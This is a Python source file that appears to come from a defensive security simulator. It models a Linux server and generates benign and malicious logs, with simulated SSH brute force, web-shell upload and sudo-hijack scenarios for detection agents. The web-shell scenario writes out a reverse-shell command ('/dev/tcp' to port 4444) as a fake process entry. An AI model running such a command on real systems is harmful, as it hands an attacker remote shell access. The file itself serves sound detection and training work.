import asyncio
import random
import time
from abc import ABC, abstractmethod
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Set
from backend.config import settings

class ServerAdapter(ABC):
    """
    Unified adapter representing a target Linux server.
    This allows agents to query system states and trigger response commands
    identically on both simulated and real servers.
    """
    @abstractmethod
    async def get_processes(self) -> List[Dict[str, Any]]:
        """Lists active running processes on the server."""
        pass

    @abstractmethod
    async def get_active_connections(self) -> List[Dict[str, Any]]:
        """Lists open socket connections (ss or netstat)."""
        pass

    @abstractmethod
    async def get_modified_files(self, path: str, minutes: int = 10) -> List[Dict[str, Any]]:
        """Finds files modified recently in the specified directory path."""
        pass

    @abstractmethod
    async def block_ip(self, ip: str) -> bool:
        """Blocks an IP address using firewalls (iptables/ufw)."""
        pass

    @abstractmethod
    async def unblock_ip(self, ip: str) -> bool:
        """Unblocks an IP address."""
        pass

    @abstractmethod
    async def kill_process(self, pid: int) -> bool:
        """Terminates a process by PID."""
        pass

    @abstractmethod
    async def delete_file(self, file_path: str) -> bool:
        """Quarantines/deletes a suspicious file."""
        pass


class SimulatedServer(ServerAdapter):
    def __init__(self):
        # Firewalls
        self.blocked_ips: Set[str] = set()
        
        # Initial standard processes
        self.processes: Dict[int, Dict[str, Any]] = {
            1: {"pid": 1, "user": "root", "cpu": 0.0, "mem": 0.1, "cmd": "/sbin/init splash"},
            501: {"pid": 501, "user": "root", "cpu": 0.1, "mem": 0.4, "cmd": "/usr/sbin/sshd -D"},
            602: {"pid": 602, "user": "root", "cpu": 0.0, "mem": 0.5, "cmd": "/usr/sbin/nginx -g daemon on;"},
            603: {"pid": 603, "user": "www-data", "cpu": 0.0, "mem": 0.8, "cmd": "nginx: worker process"},
            710: {"pid": 710, "user": "root", "cpu": 0.0, "mem": 0.3, "cmd": "/usr/sbin/cron -f"},
            1201: {"pid": 1201, "user": "webadmin", "cpu": 0.2, "mem": 1.2, "cmd": "bash"},
        }
        
        # Initial connections
        self.connections: List[Dict[str, Any]] = [
            {"local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "proto": "tcp"},
            {"local": "0.0.0.0:80", "remote": "0.0.0.0:*", "state": "LISTEN", "proto": "tcp"},
            {"local": "192.168.1.100:22", "remote": "192.168.1.15:38290", "state": "ESTABLISHED", "proto": "tcp"},
        ]
        
        # Simulated File System updates: file_path -> (modified_time, size_bytes, user)
        self.modified_files: Dict[str, Dict[str, Any]] = {
            "/var/www/html/index.html": {"path": "/var/www/html/index.html", "mtime": time.time() - 3600, "size": 1520, "user": "www-data"},
            "/etc/passwd": {"path": "/etc/passwd", "mtime": time.time() - 86400, "size": 2480, "user": "root"},
        }
        
        # Log generation paths
        self.auth_log_path = settings.log_path / "auth.log"
        self.nginx_log_path = settings.log_path / "access.log"
        
        # Clear files on startup
        self.auth_log_path.write_text("")
        self.nginx_log_path.write_text("")
        
        # Attack simulation variables
        self.active_attacks: List[str] = []

    def log_syslog(self, message: str):
        timestamp = datetime.now().strftime("%b %d %H:%M:%S")
        log_line = f"{timestamp} ubuntu {message}\n"
        with open(self.auth_log_path, "a") as f:
            f.write(log_line)

    def log_nginx(self, ip: str, method: str, path: str, status: int, size: int):
        timestamp = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "Mozilla/5.0"\n'
        with open(self.nginx_log_path, "a") as f:
            f.write(log_line)

    async def get_processes(self) -> List[Dict[str, Any]]:
        # Add random jitter to CPU/Memory to simulate life
        proc_list = []
        for pid, p in list(self.processes.items()):
            p_copy = p.copy()
            if p_copy["pid"] > 1:
                p_copy["cpu"] = round(p_copy["cpu"] + random.uniform(-0.05, 0.05), 2)
                p_copy["cpu"] = max(0.0, p_copy["cpu"])
            proc_list.append(p_copy)
        return proc_list

    async def get_active_connections(self) -> List[Dict[str, Any]]:
        return list(self.connections)

    async def get_modified_files(self, path: str, minutes: int = 10) -> List[Dict[str, Any]]:
        threshold = time.time() - (minutes * 60)
        matches = []
        for file_path, meta in self.modified_files.items():
            if file_path.startswith(path) and meta["mtime"] >= threshold:
                matches.append(meta)
        return matches

    async def block_ip(self, ip: str) -> bool:
        if ip not in self.blocked_ips:
            self.blocked_ips.add(ip)
            self.log_syslog(f"iptables[firewall]: BLOCKED traffic from {ip} (rule added: DROP)")
            
            # Remove any active socket connection associated with this IP
            self.connections = [c for c in self.connections if not c["remote"].startswith(f"{ip}:")]
            return True
        return False

    async def unblock_ip(self, ip: str) -> bool:
        if ip in self.blocked_ips:
            self.blocked_ips.remove(ip)
            self.log_syslog(f"iptables[firewall]: UNBLOCKED traffic from {ip} (rule removed)")
            return True
        return False

    async def kill_process(self, pid: int) -> bool:
        if pid in self.processes:
            cmd = self.processes[pid]["cmd"]
            del self.processes[pid]
            self.log_syslog(f"kernel: Process {pid} ({cmd}) was terminated by administrator command.")
            
            # Remove connection associated with this pid if simulated
            # For simplicity, we just keep sockets updated
            return True
        return False

    async def delete_file(self, file_path: str) -> bool:
        if file_path in self.modified_files:
            meta = self.modified_files[file_path]
            del self.modified_files[file_path]
            self.log_syslog(f"quarantine: File {file_path} deleted/quarantined successfully.")
            return True
        return False


class LogGenerator:
    """
    Background generator creating standard and malicious server activity logs.
    """
    def __init__(self, server: SimulatedServer):
        self.server = server
        self.running = False
        self.attack_task = None
        self._norm_ips = ["192.168.1.15", "192.168.1.20", "12.45.22.90", "192.168.1.100"]

    async def start(self):
        self.running = True
        asyncio.create_task(self._standard_noise_loop())

    async def stop(self):
        self.running = False

    async def _standard_noise_loop(self):
        """Generates standard web traffic and auth entries to simulate system idle states."""
        while self.running:
            try:
                # Random Nginx log
                ip = random.choice(self._norm_ips)
                if ip not in self.server.blocked_ips:
                    paths = ["/index.html", "/assets/logo.png", "/about.html", "/contact.html", "/api/status"]
                    self.server.log_nginx(ip, "GET", random.choice(paths), 200, random.randint(500, 5000))
                
                # Random syslog log (cron, SSH preauth connect/disconnect)
                if random.random() < 0.2:
                    if random.random() < 0.5:
                        self.server.log_syslog("CRON[8520]: pam_unix(cron:session): session opened for user root by (uid=0)")
                    else:
                        normal_ip = random.choice(self._norm_ips)
                        if normal_ip not in self.server.blocked_ips:
                            self.server.log_syslog(f"sshd[8530]: Connection closed by {normal_ip} port {random.randint(40000, 60000)} [preauth]")

            except Exception as e:
                print(f"Error in standard noise loop: {e}")
            await asyncio.sleep(random.uniform(2.0, 5.0))

    async def trigger_attack(self, attack_type: str):
        """Injects specific attack routines into the server state and logs."""
        if attack_type == "ssh_brute_force":
            asyncio.create_task(self._simulate_ssh_brute_force())
        elif attack_type == "web_shell":
            asyncio.create_task(self._simulate_web_shell())
        elif attack_type == "sudo_hijack":
            asyncio.create_task(self._simulate_sudo_hijack())

    async def _simulate_ssh_brute_force(self):
        attacker_ip = f"185.220.101.{random.randint(2, 254)}"
        self.server.log_syslog(f"sshd[9001]: Connection received from attacker {attacker_ip} port 51230")
        
        # 8 quick failed attempts
        for i in range(8):
            if attacker_ip in self.server.blocked_ips:
                break
            username = random.choice(["root", "admin", "ubnt", "user", "test"])
            self.server.log_syslog(f"sshd[900{i+2}]: Failed password for invalid user {username} from {attacker_ip} port {51230 + i} ssh2")
            await asyncio.sleep(1.0)
            
        # If not blocked, simulate a successful login (extreme breach)
        if attacker_ip not in self.server.blocked_ips:
            self.server.log_syslog(f"sshd[9010]: Accepted password for root from {attacker_ip} port 51238 ssh2")
            self.server.connections.append({
                "local": "192.168.1.100:22",
                "remote": f"{attacker_ip}:51238",
                "state": "ESTABLISHED",
                "proto": "tcp"
            })
            # Attacker opens an interactive shell
            pid = random.randint(15000, 20000)
            self.server.processes[pid] = {"pid": pid, "user": "root", "cpu": 0.5, "mem": 1.2, "cmd": "/bin/sh -i"}
            self.server.log_syslog(f"session[9010]: session opened for user root by root(uid=0)")

    async def _simulate_web_shell(self):
        attacker_ip = f"203.0.113.{random.randint(2, 254)}"
        
        # Step 1: Directory scan attempt
        if attacker_ip not in self.server.blocked_ips:
            self.server.log_nginx(attacker_ip, "GET", "/etc/passwd", 404, 150)
            await asyncio.sleep(1.5)
            
        # Step 2: POST command to upload page
        if attacker_ip not in self.server.blocked_ips:
            self.server.log_nginx(attacker_ip, "POST", "/upload.php?action=upload", 200, 240)
            
            # Attacker creates backdoor.php
            self.server.modified_files["/var/www/html/backdoor.php"] = {
                "path": "/var/www/html/backdoor.php",
                "mtime": time.time(),
                "size": 425,
                "user": "www-data"
            }
            self.server.log_syslog("nginx: File uploaded: /var/www/html/backdoor.php by www-data")
            await asyncio.sleep(2.0)
            
        # Step 3: Trigger the shell execution (reverse shell)
        if attacker_ip not in self.server.blocked_ips:
            self.server.log_nginx(attacker_ip, "GET", "/backdoor.php?cmd=id", 200, 50)
            
            # Spawn reverse shell processes
            pid_shell = random.randint(20001, 25000)
            self.server.processes[pid_shell] = {
                "pid": pid_shell,
                "user": "www-data",
                "cpu": 0.8,
                "mem": 1.5,
                "cmd": "/bin/sh -c sh -i >& /dev/tcp/203.0.113.88/4444 0>&1"
            }
            self.server.connections.append({
                "local": "192.168.1.100:48950",
                "remote": f"203.0.113.88:4444",
                "state": "ESTABLISHED",
                "proto": "tcp"
            })

    async def _simulate_sudo_hijack(self):
        # Normal user compromised locally
        local_user = "alice"
        attacker_ip = "192.168.1.15"  # Local system user compromise
        
        self.server.log_syslog(f"sudo: pam_unix(sudo:auth): authentication failure; logname=uid=1001 euid=0 tty=/dev/pts/1 ruser={local_user} rhost= user={local_user}")
        await asyncio.sleep(2.0)
        
        self.server.log_syslog(f"sudo:  {local_user} : command not allowed ; TTY=pts/1 ; PWD=/home/{local_user} ; USER=root ; COMMAND=/usr/bin/apt-get install -y nmap")
        
        # Modify critical configurations
        self.server.modified_files["/etc/sudoers"] = {
            "path": "/etc/sudoers",
            "mtime": time.time(),
            "size": 1720,
            "user": "root"
        }
